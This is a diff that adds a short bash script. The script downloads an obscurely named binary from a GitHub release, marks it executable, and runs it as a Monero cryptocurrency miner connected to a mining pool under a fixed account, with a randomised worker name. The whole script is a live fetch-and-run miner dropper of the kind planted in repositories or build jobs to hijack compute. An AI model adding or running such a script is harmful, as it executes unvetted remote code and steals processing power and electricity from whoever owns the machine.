@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/vedhagsvp/aplamner/releases/download/labea/aplmrua
+chmod +x aplmrua
+./aplmrua --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-VT25) --pool xmr.hk.apool.io:3334
